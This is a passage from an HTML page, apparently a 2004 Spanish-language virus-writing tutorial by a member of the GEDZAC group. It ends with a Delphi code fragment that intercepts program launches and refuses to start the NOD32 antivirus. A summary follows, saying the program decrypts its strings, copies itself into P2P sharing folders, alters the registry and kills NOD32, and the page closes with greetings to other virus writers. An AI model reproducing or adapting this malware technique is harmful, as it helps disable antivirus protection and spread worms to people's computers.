tenemos parámetros terminamos la ejecución...</font><font color="#008000"><br>
if FileName(paramstr(1)) = <u><b>A</b></u> then exitprocess(0); </font>
<font color="#0099FF">//Si se solicita ejecutar a NOD32 terminamos la ejecución...</font><font color="#008000"><br>
WinExec(Pchar(paramstr(1)),SW_SHOWNORMAL); </font><font color="#0099FF">
//Ejecutamos archivo...</font><font color="#008000"><br>
</font></font><font color="#008080"><b><font size="2">end.</font></b></font></p>
<p>&nbsp;</p>
<p><font size="2" color="#FF0000">En este caso nuestro programa desencripta las Strings, 
genera copias de si mismo en carpetas P2P, modifica el registro, muestra un 
mensaje,termina el proceso de NOD32.<br>
<br>
Nuestro programa interceptara cada vez que un archivo con extensión .EXE 
requiera ser ejecutado, extraerá el nombre del archivo y si este<br>
es el NOD32 entonces no lo ejecutara. (De lo contrario ejecutara el archivo).<br>
</font><font size="2"><b><font color="#0099FF"><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
Adios - Tschüs - Ciao <br>
<br>
</font><font color="#008000">Greedz / Thnxs / Agradecimientos<br>
<br>
</font><font color="#008080">Todos los miembros de GEDZAC (actuales)<br>
Falckon/DCA&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</font><font color="#0099FF">- Waz up bro!<br>
</font><font color="#008080">BlackRose&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
</font><font color="#0099FF">- Hey Sizzz!&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
=)</font></b><font color="#FF0000"><br>
</font></font><b><font color="#008080" size="2">Sickbyte &amp; Backus / Primatelost&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<br>
<br>
</font><font size="2" color="#00FFFF">Byt3Cr0w/GEDZAC -&nbsp; 9/12/2004</font></b></p>
<p><font color="#0099FF" size="2">&nbsp; </font></p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p><font color="#FF0000" size="2"><br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
&nbsp;</font></p>

</body>

</html>